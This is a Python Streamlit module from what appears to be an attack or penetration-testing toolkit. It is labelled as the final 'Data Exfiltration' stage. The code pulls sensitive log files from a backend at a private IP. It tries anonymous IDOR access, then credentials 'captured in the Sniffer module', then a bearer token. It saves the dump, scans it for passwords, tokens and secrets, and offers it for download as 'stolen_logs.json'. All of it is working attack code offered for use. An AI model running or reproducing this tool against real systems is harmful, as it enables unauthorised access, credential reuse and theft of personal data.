import streamlit as st
import requests
import json
import pandas as pd
import os
from datetime import datetime

st.set_page_config(page_title="Data Exfiltration", page_icon="📤", layout="wide")

st.header("📤 Privacy Data Exfiltration")
st.markdown("This module performs the final stage: **Data Exfiltration**. It connects to the backend server to dump sensitive log files, testing for **Broken Access Control** or **Credential Reuse**.")

# --- CONFIGURATION ---
col1, col2 = st.columns(2)

with col1:
    st.subheader("Target Configuration")
    target_url = st.text_input("Sensitive Asset URL", "http://192.168.88.252:3001/system_logs.json")
    
with col2:
    st.subheader("Authentication (Optional)")
    auth_mode = st.radio("Auth Method", ["None (Public/IDOR)", "Basic Auth (Credential Reuse)", "Bearer Token"])
    
    username = ""
    password = ""
    token = ""
    
    if auth_mode == "Basic Auth (Credential Reuse)":
        username = st.text_input("Username (Captured)", help="Use the creds captured in the Sniffer module")
        password = st.text_input("Password (Captured)", type="password")
    elif auth_mode == "Bearer Token":
        token = st.text_input("JWT / API Token")

# --- EXECUTION ---
if st.button("🚀 Exfiltrate Data"):
    st.info(f"Initiating connection to {target_url}...")
    
    try:
        # Prepare Headers/Auth
        auth = None
        headers = {}
        
        if auth_mode == "Basic Auth (Credential Reuse)" and username and password:
            auth = (username, password)
            st.caption(f"🔓 Attempting access using credentials: {username} / *****")
        elif auth_mode == "Bearer Token" and token:
            headers = {"Authorization": f"Bearer {token}"}
            st.caption("🔓 Attempting access using Bearer Token")
        else:
            st.caption("🔓 Attempting anonymous access (Testing for Public/IDOR)...")

        # 1. SEND REQUEST
        response = requests.get(target_url, auth=auth, headers=headers, timeout=5)
        
        # 2. CHECK RESPONSE
        if response.status_code == 200:
            st.success("✅ SUCCESS! Data Exfiltrated.")
            
            # 3. SAVE TO DISK
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"exfiltrated_data_{timestamp}.json"
            
            with open(filename, "w") as f:
                f.write(response.text)
            
            st.write(f"📁 Data saved locally as: `{filename}`")
            
            # 4. PARSE & DISPLAY
            # We assume the target is a JSON log file based on your description
            try:
                data = response.json()
                
                # Check if it's a list of logs or a wrapper object
                if isinstance(data, dict) and "logs" in data:
                    df = pd.DataFrame(data["logs"])
                else:
                    df = pd.DataFrame(data)

                st.subheader("🔍 Sensitive Data Preview")
                st.dataframe(df)
                
                # Automated PI (Personal Info) Hunting
                st.write("### 🚨 PII / Credential Hunt")
                
                # Convert whole object to string to search for keywords
                text_dump = json.dumps(data)
                keywords = ["password", "email", "token", "key", "admin", "secret"]
                found_flags = [k for k in keywords if k in text_dump.lower()]
                
                if found_flags:
                    st.error(f"⚠️ SENSITIVE KEYWORDS FOUND: {', '.join(found_flags)}")
                else:
                    st.info("No obvious credential keywords found in the dump.")
                    
                # Download Button for the report
                st.download_button(
                    label="📥 Download JSON Dump",
                    data=json.dumps(data, indent=4),
                    file_name="stolen_logs.json",
                    mime="application/json"
                )

            except ValueError:
                st.warning("⚠️ Data was retrieved but is not valid JSON. Showing raw text:")
                st.text_area("Raw Output", response.text, height=300)

        elif response.status_code == 401:
            st.error("❌ Exfiltration Failed: 401 Unauthorized. The backend requires valid credentials.")
        elif response.status_code == 403:
            st.error("❌ Exfiltration Failed: 403 Forbidden. You do not have permission to access this resource.")
        else:
            st.error(f"❌ Failed with Status Code: {response.status_code}")

    except requests.exceptions.ConnectionError:
        st.error(f"❌ Connection Error. Is the backend server (Port 3001) reachable from this machine?")
    except Exception as e:
        st.error(f"❌ An unexpected error occurred: {e}")
